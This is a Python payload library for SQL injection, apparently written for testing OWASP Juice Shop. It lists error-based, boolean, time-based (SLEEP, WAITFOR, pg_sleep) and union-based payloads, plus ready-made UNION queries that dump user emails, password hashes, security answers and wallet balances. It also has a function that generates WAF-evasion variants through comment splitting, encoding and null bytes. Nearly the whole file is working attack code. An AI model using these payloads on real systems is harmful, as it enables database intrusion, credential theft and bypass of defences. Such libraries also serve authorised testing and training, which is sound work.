
# payloads.py - SQL Injection Payload Library
# Error-Based, Boolean-Based, Time-Based, Union-Based, WAF Evasion


# Error-based payloads. These trigger visible SQL errors in the response.
ERROR_BASED = [
"'",
'"',
"''",
"`",
"\\",
"';",
'";',
"'--",
'"--',
"'#",
'"#',
# Boolean confusion
"' OR '1'='1",
'" OR "1"="1',
"' OR 1=1--",
"' OR 1=1#",
"' OR 1=1/*",
"') OR ('1'='1",
'") OR ("1"="1',
"' OR 'x'='x",
# Stacked / heavy
"1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
"1 AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
"' OR UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--",
"' HAVING 1=1--",
"' GROUP BY columnnames having 1=1--",
"1; SELECT 1",
"1'; SELECT 1--",
# UNION canary (may expose column mismatch errors)
"' UNION ALL SELECT NULL--",
"' UNION ALL SELECT NULL,NULL--",
"' UNION ALL SELECT NULL,NULL,NULL--",
# Auth bypass classics
"' OR ''='",
"' OR 1--",
"or 1=1--",
"' OR 'one'='one",
"admin'--",
"admin' #",
"admin'/*",
]

# Error signatures to scan for in responses (case-insensitive)
ERROR_SIGNATURES = [
    # MySQL
    "you have an error in your sql syntax",
    "warning: mysql",
    "mysql_fetch_array()",
    "mysql_num_rows()",
    "mysql_fetch_object()",
    "supplied argument is not a valid mysql",
    "com.mysql.jdbc.exceptions",
    # SQLite
    "sqlite_exception",
    "sqlite3::query",
    "unrecognized token",
    "sqlite error",
    "near \"",   # common sqlite parse error fragment
    # Oracle
    "ora-01756",
    "ora-00907",
    "ora-00933",
    "ora-00936",
    "ora-",
    # PostgreSQL
    "pg_query()",
    "unterminated quoted string",
    "pg_exec()",
    "invalid input syntax for",
    # MSSQL
    "microsoft sql server",
    "odbc sql server driver",
    "sqlsrv_query()",
    "mssql_query()",
    "sqlstate",
    "unclosed quotation mark",
    "incorrect syntax near",
    # Java ORMs
    "org.hibernate.exception",
    "java.sql.sqlexception",
    "javax.servlet.servletexception",
    # Generic
    "sql syntax",
    "syntax error",
    "quoted string not properly terminated",
    "sql error",
    "database error",
    "db error",
    "error in your sql",
    "sqlexception",
]

# Boolean-based payloads. Each tuple: (always_true_payload, always_false_payload)

BOOLEAN_BASED = [
    ("' AND '1'='1'--",        "' AND '1'='2'--"),
    ("' AND 1=1--",            "' AND 1=2--"),
    ("' OR 1=1--",             "' OR 1=2--"),
    ("' AND 'a'='a'--",        "' AND 'a'='b'--"),
    ("1 AND 1=1",              "1 AND 1=2"),
    ("1' AND 1=1--",           "1' AND 1=2--"),
    ("') AND ('1'='1",         "') AND ('1'='2"),
    ('" AND "1"="1"--',        '" AND "1"="2"--'),
    ("' AND LENGTH(database())>0--", "' AND LENGTH(database())>9999--"),
    ("1 AND 1=1--",            "1 AND 1=2--"),
    ("' OR 'unusual'='unusual'--", "' OR 'unusual'='notunusual'--"),
    ("' AND SUBSTR('a',1,1)='a'--", "' AND SUBSTR('a',1,1)='b'--"),
]

# Time-based payloads. Inject delays to confirm blind injection when no output is visible.

TIME_BASED = {
    "mysql": [
        "'; SLEEP({t})--",
        "' OR SLEEP({t})--",
        "' AND SLEEP({t})--",
        "1; SLEEP({t})--",
        "1' AND SLEEP({t})--",
        "'; SELECT SLEEP({t})--",
        "' AND (SELECT * FROM (SELECT(SLEEP({t})))a)--",
        "') OR SLEEP({t})('",
        "1 OR SLEEP({t})",
        "' OR SLEEP({t})#",
        "'; SLEEP({t})#",
        "' AND SLEEP({t})#",
    ],
    "mssql": [
        "'; WAITFOR DELAY '0:0:{t}'--",
        "1; WAITFOR DELAY '0:0:{t}'--",
        "' WAITFOR DELAY '0:0:{t}'--",
        "'; IF 1=1 WAITFOR DELAY '0:0:{t}'--",
        "1'; WAITFOR DELAY '0:0:{t}'--",
    ],
    "postgresql": [
        "'; SELECT pg_sleep({t})--",
        "' OR pg_sleep({t})--",
        "'; SELECT pg_sleep({t})#",
        "1; SELECT pg_sleep({t})--",
        "' AND 1=(SELECT 1 FROM PG_SLEEP({t}))--",
    ],
    "sqlite": [
        # SQLite has no SLEEP, use heavy computation instead
        "' AND RANDOMBLOB(200000000)--",
        "'; SELECT RANDOMBLOB(200000000)--",
        "1 AND RANDOMBLOB(200000000)",
    ],
    "oracle": [
        "' OR 1=1 AND (SELECT UTL_HTTP.REQUEST('http://localhost') FROM DUAL) IS NOT NULL--",
        "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(65)||CHR(65),{t})--",
    ],
}


def get_time_payloads(seconds: int = 5) -> list:
    # Return all time-based payloads with {t} replaced by seconds
    payloads = []
    for db_type, pl_list in TIME_BASED.items():
        for p in pl_list:
            payloads.append((p.replace("{t}", str(seconds)), db_type))
    return payloads  # list of (payload_str, db_hint)

# Union-based payloads

def union_order_by(n: int) -> str:
    # ORDER BY n, used to find column count (fails when n exceeds column count)
    return f"' ORDER BY {n}--"


def union_null_probe(n: int) -> str:
    # UNION SELECT with n NULLs, confirms n matches column count when no error
    nulls = ",".join(["NULL"] * n)
    return f"' UNION SELECT {nulls}--"


def union_extract(cols: list) -> str:
    # Build a UNION SELECT with the given column expressions
    return f"' UNION SELECT {','.join(cols)}--"

# Ready-made extraction queries for SQLite (Juice Shop's DB engine)
UNION_EXTRACT_QUERIES = {
    "sqlite_version":   "' UNION SELECT sqlite_version(),NULL--",
    "sqlite_tables":    "' UNION SELECT group_concat(name,'|'),NULL FROM sqlite_master WHERE type='table'--",
    "users_table":      "' UNION SELECT group_concat(email||':'||password,'|'),NULL FROM Users--",
    "users_full":       "' UNION SELECT group_concat(id||'~'||email||'~'||password||'~'||role,'|'),NULL FROM Users--",
    "security_answers": "' UNION SELECT group_concat(UserId||':'||answer,'|'),NULL FROM SecurityAnswers--",
    "wallet_balances":  "' UNION SELECT group_concat(UserId||':'||balance,'|'),NULL FROM Wallets--",
}

# Template queries that need a {table} substituted in
UNION_TABLE_SCHEMA = "' UNION SELECT group_concat(sql),NULL FROM sqlite_master WHERE type='table' AND name='{table}'--"


# WAF evasion variants. Generate obfuscated variants of a payload to bypass simple filters.

def apply_waf_evasion(payload: str) -> list:
    # Return a list of WAF-evasion variants for the given payload
    variants = [payload]

    # 1. Inline comment injection between SQL keywords
    for kw in ["SELECT", "UNION", "OR", "AND", "WHERE", "FROM", "SLEEP", "INSERT"]:
        if kw in payload.upper():
            # lowercase with comment wrapper
            variants.append(
                payload.replace(kw, f"/*{kw.lower()}*/", 1)
            )
            # split the keyword itself
            if len(kw) > 3:
                variants.append(
                    payload.replace(kw, f"{kw[:2]}/**/{kw[2:]}", 1)
                )

    # 2. Case randomization (alternating case)
    swapped = "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload))
    variants.append(swapped)

    # 3. URL encoding of key characters
    url_enc = (
        payload
        .replace("'", "%27")
        .replace(" ", "%20")
        .replace("=", "%3D")
        .replace("(", "%28")
        .replace(")", "%29")
    )
    variants.append(url_enc)

    # 4. Double URL encoding
    double_enc = (
        payload
        .replace("'", "%2527")
        .replace(" ", "%2520")
    )
    variants.append(double_enc)

    # 5. Whitespace substitution
    for ws in ["\t", "\n", "/**/", "/*!*/"]:
        variants.append(payload.replace(" ", ws))

    # 6. Hex encoding of string literals
    variants.append(payload.replace("'1'", "0x31").replace("'a'", "0x61"))

    # 7. Null-byte prefix (breaks naive string matching)
    variants.append("%00" + payload)

    # Remove exact duplicates while preserving order
    seen = set()
    unique = []
    for v in variants:
        if v not in seen:
            seen.add(v)
            unique.append(v)
    return unique
